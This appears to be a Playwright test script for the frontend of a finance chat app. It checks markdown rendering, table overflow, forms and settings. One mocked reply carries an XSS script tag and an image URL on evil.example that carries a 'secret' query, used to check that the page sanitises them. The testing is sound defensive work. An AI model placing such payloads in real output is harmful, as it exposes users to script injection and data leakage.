import fs from 'node:fs'
import { chromium, BASE, OUT, newPage, ROUTES } from './common.mjs'
const res = {}
const browser = await chromium.launch()
const step = async (name, fn) => { try { await fn() } catch (e) { res[name + '_ERR'] = String(e).slice(0, 240) } }
const names = (page, sel) => page.locator(sel).evaluateAll((els) => els.map((e) => (e.getAttribute('aria-label') || e.textContent || '').trim().slice(0, 40)))
const leave = async (page) => { await page.waitForTimeout(400); if (await page.locator('.live-meeting').count()) { await page.getByRole('button', { name: 'End session' }).click(); await page.waitForTimeout(400) } }

// ---- A: crafted markdown reply, message actions
{
  const { ctx, page } = await newPage(browser, { width: 1440, height: 900 })
  await page.goto(`${BASE}/#/chat`); await page.waitForSelector('.live-meeting'); await leave(page)
  const md = '## Your SIP\n\nMonthly **₹10,000** for 10 years at 12% gives about ₹23.2 lakh.\n\n| Year | Value |\n|---|---|\n| 1 | ₹1,26,825 |\n| 10 | ₹23,23,391 |\n\n![tracker](https://evil.example/x.png?q=secret)\n\n<script>window.__xss=1</script> [link](https://example.com) \n\n- one\n- two\n\n' + 'Long unbroken text ' + 'x'.repeat(300)
  await page.route('**/api/chat', (r) => r.request().method() === 'POST' ? r.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ domain: 'finance', query: 'q', response: md, blocks: [], audio_token: null, grounding: { numbers_checked: true, passed: true, fallback: false, unavailable: [] } }) }) : r.continue())
  const box = page.getByRole('textbox', { name: 'Message ARIA' })
  await box.fill('show markdown'); await box.press('Enter'); await page.waitForTimeout(1500)
  await step('actions', async () => {
    res.md = { html: (await page.locator('.markdown-body').first().innerHTML()).slice(0, 900), img: await page.locator('.chat-thread img').count(), xss: await page.evaluate(() => window.__xss), actions: await names(page, '.chat-thread button'), links: await page.locator('.markdown-body a').evaluateAll((a) => a.map((x) => [x.href, x.target, x.rel])), sideScroll: await page.evaluate(() => document.documentElement.scrollWidth > innerWidth), tableScroll: await page.locator('.markdown-body table').first().evaluate((t) => { const p = t.parentElement; return { tw: t.scrollWidth, pw: p.clientWidth, ov: getComputedStyle(p).overflowX } }) }
    await page.screenshot({ path: `${OUT}/tests/frontend/shots/d-markdown-1440.png` })
    const copy = page.getByRole('button', { name: /copy/i }).first(); res.copyLabel = await copy.getAttribute('aria-label')
    res.rateDisabledNoId = await page.getByRole('button', { name: /good|helpful|thumb/i }).evaluateAll((b) => b.map((x) => [x.getAttribute('aria-label'), x.disabled, x.getAttribute('aria-pressed')]))
    res.suggestionChips = await names(page, '.chat-thread [class*=suggest] button, .chat-thread [class*=chip]')
  })
  await ctx.close()
}
// 390 markdown table
{
  const { ctx, page } = await newPage(browser, { width: 390, height: 800 })
  await page.goto(`${BASE}/#/chat`); await page.waitForSelector('.live-meeting'); await leave(page)
  const md = '| Year | Value | Gain | Rate |\n|---|---|---|---|\n| 1 | ₹1,26,825 | ₹6,825 | 12.0% |\n| 10 | ₹23,23,391 | ₹11,23,391 | 12.0% |\n\nLong unbroken ' + 'y'.repeat(200)
  await page.route('**/api/chat', (r) => r.request().method() === 'POST' ? r.fulfill({ status: 200, contentType: 'application/json', body: JSON.stringify({ domain: 'finance', query: 'q', response: md, blocks: [] }) }) : r.continue())
  const box = page.getByRole('textbox', { name: 'Message ARIA' }); await box.fill('table'); await box.press('Enter'); await page.waitForTimeout(1500)
  res.md390 = { side: await page.evaluate(() => [document.documentElement.scrollWidth, innerWidth]) }
  await page.screenshot({ path: `${OUT}/tests/frontend/shots/d-markdown-390.png` })
  await ctx.close()
}
// ---- B: forms and page states at 1440
{
  const { ctx, page, log } = await newPage(browser, { width: 1440, height: 900 })
  await page.goto(`${BASE}/#/feedback`); await page.waitForTimeout(1200)
  await step('feedback', async () => {
    res.feedback = { fields: await page.locator('main input, main select, main textarea').evaluateAll((e) => e.map((x) => [x.tagName, x.type, x.required, x.getAttribute('aria-invalid'), x.maxLength > 0 ? x.maxLength : null, x.name || x.id])), btns: await names(page, 'main button'), text: (await page.locator('main').innerText()).slice(0, 500) }
    await page.screenshot({ path: `${OUT}/tests/frontend/shots/e-feedback-1440.png` })
    const send = page.getByRole('button', { name: /^Send/ }); res.feedback.sendDisabledAtStart = await send.isDisabled()
    await page.getByLabel(/message/i).first().fill('short'); await send.click().catch(() => {}); await page.waitForTimeout(600)
    res.feedback.afterShort = (await page.locator('main').innerText()).slice(-250)
    await page.getByLabel(/email/i).first().fill('not-an-email'); await page.getByLabel(/message/i).first().fill('This is a long enough synthetic feedback message.'); await send.click().catch(() => {}); await page.waitForTimeout(800)
    res.feedback.afterBadEmail = (await page.locator('main').innerText()).slice(-250)
  })
  await page.goto(`${BASE}/#/profile`); await page.waitForTimeout(1500)
  await step('profile', async () => {
    res.profile = { text: (await page.locator('main').innerText()).slice(0, 700), btns: await names(page, 'main button') }
    await page.screenshot({ path: `${OUT}/tests/frontend/shots/e-profile-1440.png`, fullPage: true })
  })
  await page.goto(`${BASE}/#/explore`); await page.waitForTimeout(1000)
  await step('explore', async () => {
    const q = page.getByRole('combobox').first(); await q.fill('zzzzqx'); await page.waitForTimeout(1200)
    res.exploreEmpty = (await page.locator('main').innerText()).slice(0, 500)
    await q.fill('nifty'); await page.waitForTimeout(1500)
    res.exploreResults = await page.getByRole('option').count()
    await page.screenshot({ path: `${OUT}/tests/frontend/shots/e-explore-1440.png` })
    await page.getByRole('option').first().click(); await page.waitForTimeout(1500)
    res.drawer = { dialog: await page.getByRole('dialog').count(), text: (await page.getByRole('dialog').first().innerText()).slice(0, 700) }
    await page.screenshot({ path: `${OUT}/tests/frontend/shots/e-drawer-1440.png` })
    await page.keyboard.press('Escape'); await page.waitForTimeout(400)
    res.drawerEsc = await page.getByRole('dialog').count()
  })
  await page.goto(`${BASE}/#/intelligence`); await page.waitForTimeout(1000)
  await step('intel', async () => {
    res.intelAtStart = (await page.locator('main').innerText()).slice(0, 400)
    await page.getByRole('button', { name: /analy/i }).first().click().catch(() => {}); await page.waitForTimeout(700)
    res.intelEmptySubmit = (await page.locator('main').innerText()).slice(0, 300)
    await page.screenshot({ path: `${OUT}/tests/frontend/shots/e-intel-1440.png` })
  })
  await page.goto(`${BASE}/#/research`); await page.waitForTimeout(1000)
  res.research = (await page.locator('main').innerText()).slice(0, 400)
  await page.goto(`${BASE}/#/progress`); await page.waitForTimeout(1000)
  res.progress = (await page.locator('main').innerText()).slice(0, 400)
  await page.goto(`${BASE}/#/nonsense`); await page.waitForTimeout(800)
  res.badHash = { url: page.url(), live: await page.locator('.live-meeting').count() }
  await page.goto(`${BASE}/#/settings`); await page.waitForTimeout(800)
  await step('settings', async () => {
    await page.getByLabel('Night').check(); await page.waitForTimeout(300)
    res.nightMode = { dataMode: await page.evaluate(() => document.documentElement.dataset.mode), stored: await page.evaluate(() => localStorage.getItem('aria_mode')) }
    await page.screenshot({ path: `${OUT}/tests/frontend/shots/e-settings-night-1440.png` })
    await page.reload(); await page.waitForTimeout(800)
    res.nightPersist = await page.evaluate(() => document.documentElement.dataset.mode)
    res.settingsText = (await page.locator('main').innerText()).slice(0, 500)
  })
  res.pagesConsole = log.console.slice(0, 8); res.pagesHttp = log.http.slice(0, 8)
  await ctx.close()
}
await browser.close()
fs.writeFileSync(`${OUT}/evaluation/frontend_pages.json`, JSON.stringify(res, null, 1))
console.log(JSON.stringify(res, null, 1))
